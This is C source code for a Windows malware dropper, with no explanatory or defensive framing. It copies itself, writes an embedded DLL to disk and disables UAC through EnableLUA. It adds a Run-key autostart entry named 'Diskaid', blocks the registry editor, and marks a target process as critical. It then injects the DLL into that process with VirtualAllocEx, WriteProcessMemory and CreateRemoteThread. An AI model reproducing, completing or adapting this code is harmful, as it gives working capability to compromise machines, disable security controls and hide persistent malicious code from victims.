#include "dep.h"
#include "data.h"

typedef NTSTATUS(NTAPI* NtSetInformationProcess) (HANDLE processHandle, DWORD infoClass, PVOID info, ULONG infoLength);

DWORD PIDBYNAME(LPCWSTR lpProcessName) {
	DWORD dpid = NULL;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	PROCESSENTRY32W procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32W);
	if (!Process32FirstW(hSnapshot, &procEntry)) goto exit;
	while (1) {
		if (!Process32NextW(hSnapshot, &procEntry)) goto exit;
		else if (!lstrcmpW(lpProcessName, procEntry.szExeFile)) {
			dpid = procEntry.th32ProcessID;
			break;
		}
		else continue;
	}
	return dpid;
exit:
	ExitProcess(NULL);
}

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd) {
	HKEY rkey;
	DWORD dd = NULL, dd2 = TRUE;
	WCHAR szEXEPATH[MAX_PATH];
	GetModuleFileName(NULL, szEXEPATH, MAX_PATH);
	CopyFile(szEXEPATH, EXEPATH, TRUE);
	HANDLE dropdll = CreateFileW(DLLPATH, FILE_GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
	WriteFile(dropdll, rawData, sizeof(rawData), &dd, NULL);
	CloseHandle(dropdll);
	RegCreateKeyW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &rkey);
	RegSetValueExW(rkey, L"EnableLUA", NULL, REG_DWORD, &dd, sizeof(DWORD));
	RegCloseKey(rkey);
	RegCreateKeyW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &rkey);
	RegSetValueExW(rkey, L"Diskaid", NULL, REG_SZ, EXEPATH, sizeof(EXEPATH));
	RegCloseKey(rkey);
	RegCreateKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &rkey);
	RegSetValueExW(rkey, L"DisableRegistryTools", NULL, REG_DWORD, &dd2, sizeof(DWORD));
	RegCloseKey(rkey);
	dd2 = NULL;
	SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, NULL, L"Environment", SMTO_ABORTIFHUNG, 5000, &dd);
	dd = PIDBYNAME(PFILENAME);
	HANDLE hpid = OpenProcess(PROCESS_ALL_ACCESS, NULL, dd);
	HMODULE ntdll = LoadLibrary(L"ntdll.dll");
	NtSetInformationProcess NtSetInfoProcess = (NtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
	NtSetInfoProcess(hpid, 29, &dd2, sizeof(DWORD));
	if (hpid == INVALID_HANDLE_VALUE) goto exit;
	LPVOID allocex = VirtualAllocEx(hpid, NULL, sizeof(DLLPATH), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(hpid, allocex, DLLPATH, sizeof(DLLPATH), NULL);
	HANDLE hcrt = CreateRemoteThread(hpid, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, allocex, NULL, NULL);
	CloseHandle(hpid);
	goto exit;
exit:
	ExitProcess(NULL);
}